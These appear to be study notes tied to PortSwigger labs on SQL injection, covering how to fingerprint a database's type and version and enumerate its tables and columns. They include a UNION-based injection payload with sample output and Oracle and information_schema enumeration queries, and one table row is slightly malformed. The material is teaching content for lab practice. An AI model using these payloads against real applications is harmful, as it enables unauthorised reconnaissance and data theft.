# Examining the database

# Identifying Database Query

```sql
SELECT * FROM v$version
SELECT * FROM information_schema.tables
```

[Examining the database in SQL injection attacks | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database)

# **Querying the database type and version**

| Database type | Query                   |
|---------------|-------------------------|
| "Microsoft    | MySQL",SELECT @@version |
| Oracle        | SELECT * FROM v$version |
| PostgreSQL    | SELECT version()        |

## Attack Payload to Identify Database

This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used

```sql
' UNION SELECT @@version--

Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

## Lab

[**Lab: SQL injection attack, querying the database type and version on Oracle**](./lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle.md)

[**Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**](./lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft.md)

# **Listing the contents of the database**

You can query `information_schema.tables` to list the tables in the database:

```sql
SELECT * FROM information_schema.tables

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
=====================================================
MyDatabase dbo Products BASE TABLE
MyDatabase dbo Users BASE TABLE
MyDatabase dbo Feedback BASE TABLE
```

## Lab

[**Lab: SQL injection attack, listing the database contents on non-Oracle databases**](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases.md)

# **Equivalent to information schema on Oracle**

On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying `all_tables`:

`SELECT * FROM all_tables`

And you can list columns by querying `all_tab_columns`:

`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

## Lab

[**Lab: SQL injection attack, listing the database contents on Oracle**](./lab-sql-injection-attack-listing-the-database-contents-on-oracle.md)

